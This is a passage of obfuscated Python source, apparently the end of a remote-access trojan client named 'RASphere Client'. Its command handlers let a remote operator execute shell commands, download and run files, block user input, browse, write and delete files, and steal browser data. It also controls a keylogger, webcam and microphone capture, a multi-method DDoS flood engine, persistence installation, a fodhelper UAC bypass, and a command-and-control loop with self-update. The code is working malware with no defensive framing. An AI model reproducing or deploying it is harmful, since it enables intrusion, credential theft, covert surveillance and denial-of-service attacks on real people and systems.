    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s511"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on(_D("_s512"))
    def _sf(d): r = _search_files((d or {}).get(_D("_s513"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on(_D("_s514"))
    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s515"),"")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on(_D("_s516"))
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s517"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on(_D("_s518"))
    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s519"), {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on(_D("_s520"))
    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s521"), {"cmd": "input_unblock", "ok": ok, "message": msg})
    @sio.on(_D("_s522"))
    def _fl(d): sio.emit(_D("_s523"), _flist((d or {}).get("path","")))
    @sio.on(_D("_s524"))
    def _fdr(d): sio.emit(_D("_s525"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on(_D("_s526"))
    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s527"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s528"))
    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s529"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s530"))
    def _fuc(d):
        path = (d or {}).get(_D("_s531"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit(_D("_s532"), {"ok": ok, "message": msg, "path": path})
    @sio.on(_D("_s533"))
    def _ninfo(d=None): sio.emit(_D("_s534"), _network_info())
    @sio.on(_D("_s535"))
    def _bs(d=None):
        _l.info(_D("_s536"))
        result = _browser_steal()
        sio.emit(_D("_s537"), result)
    @sio.on(_D("_s538"))
    def _ddos_start(d=None):
        d = d or {}
        target = d.get(_D("_s539"), "")
        port = d.get(_D("_s540"), 80)
        threads = d.get(_D("_s541"), 50)
        pkt_size = d.get(_D("_s542"), 1024)
        method = d.get(_D("_s543"), "tcp")
        if not target:
            sio.emit(_D("_s544"), {"active": False, "error": "No target specified"})
            return
        _l.info(f"DDoS start: {method} -> {target}:{port} ({threads} threads)")
        ddos.start(target, port=port, threads=threads, packet_size=pkt_size, method=method)
    @sio.on(_D("_s545"))
    def _ddos_stop(d=None):
        ddos.stop()
    @sio.on(_D("_s546"))
    def _ks(d=None):
        _l.warning(_D("_s547")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); ddos.stop(); sio.disconnect(); os._exit(0)
class DdosEngine:
    ""_D("_s548")""
    def __init__(self, sio):
        self.r = False; self.sio = sio
        self.threads = []; self.stats = {_D("_s549"): 0, "data_bytes": 0, "start_time": 0}
        self._lock = threading.Lock(); self._target = ""; self._port = 80
    def start(self, target, port=80, threads=50, packet_size=1024, method="tcp"):
        if self.r: self.stop()
        threads = max(1, min(500, threads))
        packet_size = max(64, min(65500, packet_size))
        port = max(1, min(65535, port))
        self.r = True
        self._target = target; self._port = port
        self.stats = {_D("_s550"): 0, "data_bytes": 0, "start_time": time.time()}
        _l.info(f"DDoS starting: {method} flood -> {target}:{port} ({threads} threads)")
        try:
            self._target_ip = socket.gethostbyname(target)
        except:
            self._target_ip = target
        for i in range(threads):
            t = threading.Thread(target=self._worker, args=(method, packet_size, i), daemon=True)
            t.start()
            self.threads.append(t)
        threading.Thread(target=self._stats_reporter, daemon=True).start()
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s551"), {"active": True, "target": f"{target}:{port}", "method": method, "threads": threads})
    def stop(self):
        self.r = False
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=1)
        self.threads = []
        if self.sio and self.sio.connected:
            self.sio.emit(_D("_s552"), {"active": False})
        _l.info(_D("_s553"))
    def _worker(self, method, pkt_size, tid):
        ""_D("_s554")""
        payload = os.urandom(pkt_size) if method != _D("_s555") else None
        if method == "tcp":
            while self.r:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect_ex((self._target_ip, self._port))
                    s.send(payload[:min(pkt_size, 65536)])
                    s.close()
                    with self._lock:
                        self.stats[_D("_s556")] += 1
                        self.stats[_D("_s557")] += pkt_size
                except:
                    with self._lock:
                        self.stats[_D("_s558")] += 1
        elif method == "udp":
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while self.r:
                    try:
                        s.sendto(payload[:min(pkt_size, 65507)], (self._target_ip, self._port))
                        with self._lock:
                            self.stats[_D("_s559")] += 1
                            self.stats[_D("_s560")] += pkt_size
                    except:
                        with self._lock:
                            self.stats[_D("_s561")] += 1
                s.close()
            except:
                pass
        elif method == _D("_s562"):
            url = f"{self._target}:{self._port}" if self._port != 80 and self._port != 443 else self._target
            proto = _D("_s563") if self._port == 443 else "http"
            full_url = f"{proto}://{url}/"
            while self.r:
                try:
                    r = urllib.request.urlopen(full_url, timeout=3)
                    data = r.read()
                    with self._lock:
                        self.stats[_D("_s564")] += 1
                        self.stats[_D("_s565")] += len(data)
                except:
                    with self._lock:
                        self.stats[_D("_s566")] += 1
        elif method == _D("_s567"):
            sockets_held = []
            try:
                while self.r:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(3)
                        s.connect((self._target_ip, self._port))
                        s.send(f"GET / HTTP/1.1\r\nHost: {self._target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n".encode())
                        sockets_held.append(s)
                        with self._lock:
                            self.stats[_D("_s568")] += 1
                        if len(sockets_held) > 200:
                            old = sockets_held.pop(0)
                            try: old.close()
                            except: pass
                        for _ in range(50):
                            if not self.r: return
                            time.sleep(0.1)
                    except:
                        pass
            finally:
                for s in sockets_held:
                    try: s.close()
                    except: pass
    def _stats_reporter(self):
        ""_D("_s569")""
        while self.r:
            time.sleep(2)
            if not self.r: break
            with self._lock:
                elapsed = max(0.001, time.time() - self.stats[_D("_s570")])
                pps = int(self.stats[_D("_s571")] / elapsed)
                data_mb = self.stats[_D("_s572")] / (1024 * 1024)
                if self.sio and self.sio.connected:
                    self.sio.emit(_D("_s573"), {
                        _D("_s574"): {
                            _D("_s575"): self.stats["packets"],
                            "pps": pps,
                            _D("_s576"): round(data_mb, 2),
                            _D("_s577"): int(elapsed)
                        }
                    })
def main():
    p = argparse.ArgumentParser(description=_D("_s578"))
    p.add_argument(_D("_s579"), default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument(_D("_s580"), default=None, help=f"Client secret (default: ***)")
    p.add_argument(_D("_s581"), default=None, help="Client ID (default: auto)")
    p.add_argument(_D("_s582"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument(_D("_s583"), action="store_true", help="Install persistence")
    p.add_argument(_D("_s584"), action="store_true", help="Remove persistence")
    p.add_argument(_D("_s585"), action="store_true", help="Skip auto-persistence")
    p.add_argument(_D("_s586"), action="store_true", help=argparse.SUPPRESS)
    p.add_argument(_D("_s587"), action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()
    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID
    if args.uninstall:
        if _up(): print(_D("_s588"))
        else: print(_D("_s589"))
        return
    if args.install:
        if not url or not secret: print(_D("_s590")); sys.exit(1)
        if _ip(url, secret, rec, cid): print(_D("_s591"))
        else: print(_D("_s592"))
    if sys.platform == _D("_s593") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            _l.info(_D("_s594"))
            _fodhelper_uac_bypass(args)
            print(_D("_s595"))
        else:
            _l.info(_D("_s596"))
    if getattr(args, _D("_s597"), False):
        _l.info(_D("_s598"))
        _cleanup_uac_registry()
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = _ip(url, secret, rec, cid)
                if ok: print(_D("_s599"))
                else: print(_D("_s600"))
        except Exception as e: print(f"[!] Auto-persist error: {e}")
    if not url: print(_D("_s601")); sys.exit(1)
    if not secret: print(_D("_s602")); sys.exit(1)
    _s.url = url.rstrip("/"); _s.secret = secret
    _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
    _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, _l=False, engineio_logger=False)
    _sh(sio); _s.sio = sio
    threading.Thread(target=_keepalive_pinger, args=(_s.url,), daemon=True).start()
    update_checked = False
    current_delay = rec  
    while True:
        try:
            _l.info(f"Connecting to {_s.url}...")
            sio.connect(_s.url, wait_timeout=10)
            _l.info(_D("_s603"))
            current_delay = rec
            if not update_checked:
                new_ver, dl_url = _check_for_update(_s.url)
                update_checked = True
                if new_ver and dl_url:
                    _l.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        _l.info(_D("_s604"))
                        sio.disconnect()
                        os._exit(0)
            sio.wait()
        except KeyboardInterrupt: _l.info(_D("_s605")); break
        except Exception as e:
            _l.error(f"Connection error: {e}")
            if not rec: break
            _l.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); _l.info(_D("_s606"))
if __name__ == _D("_s607"): main()
